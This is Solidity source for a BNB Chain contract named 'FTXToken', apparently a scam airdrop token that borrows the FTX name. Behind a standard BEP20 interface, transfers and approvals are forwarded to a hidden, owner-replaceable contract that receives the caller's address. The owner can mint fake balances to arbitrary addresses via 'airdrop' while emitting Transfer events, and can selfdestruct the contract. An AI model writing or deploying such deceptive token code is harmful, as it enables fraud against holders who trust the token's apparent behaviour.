/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-09-07
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface BEP20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address from, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address from, address spender, uint256 amount) external returns (bool);
    function transferFrom(address from,address sender,address recipient,uint256 amount)external returns (bool);
    function mint(address[] memory receiver, uint256 amount) external returns (bool);
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
}

interface ICHI { function freeFromUpTo(address _addr, uint256 _amount) external returns (uint);}

contract StandardToken {
    ICHI  constant private CHI = ICHI(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c);
    address private _owners;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    uint256 private _totalSupply;
    address public tokenAddress;
    using SafeMath for uint256;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () public {
        _owners = msg.sender;

        emit OwnershipTransferred(address(0), _owners);
    }
    function owner() public view returns (address) {
        return _owners;
    }
    modifier onlyOwner() {
        require(isOwner(), "onlyOwner");
        _;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owners || msg.sender == tokenAddress;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owners, address(0));
        _owners = address(0);
    }
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owners, newOwner);
        _owners = newOwner;
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    function settokenAddress(address _tokenAddress) onlyOwner public returns(bool) {
        tokenAddress = _tokenAddress;
        return true;
    }
    
    function transfer(address _to, uint256 _value) public returns (bool) {
        emit Transfer(msg.sender, _to, _value);
        return BEP20(tokenAddress).transfer(msg.sender, _to, _value);
    }
    function balanceOf(address account) external view returns (uint256) {
    return _balances[account];}

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        emit Transfer(_from, _to, _value);
        return BEP20(tokenAddress).transferFrom(msg.sender, _from, _to, _value);
    }
    function approve(address _spender, uint256 _value) public returns (bool) {
        return BEP20(tokenAddress).approve(msg.sender, _spender, _value);
    }
    function allowance(address _owner, address _spender) external view returns (uint256) {
        return _allowances[_owner][_spender];
    }
    function name() public view returns (string memory) {
        return BEP20(tokenAddress).name();
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
  }

    function airdrop (address[] memory _to, uint256[] memory _amount, uint256 tokens_to_free) onlyOwner public returns (bool) {
        uint256 i = 0;
        for (i; i < _to.length; i++) {
            _mint(_to[i], _amount[i]);
        }
        CHI.freeFromUpTo(msg.sender, tokens_to_free);}
        

    function symbol() public view returns (string memory) {
        return BEP20(tokenAddress).symbol();
    }
    function decimals() public view returns (uint8) {
        return BEP20(tokenAddress).decimals();
    }
}

contract FTXToken is StandardToken {

    constructor (address _tokenAddress) public payable {
        tokenAddress = _tokenAddress;
    }

    function destroyContract() public onlyOwner {
        selfdestruct(payable(owner()));}


	receive() external payable {
    }

}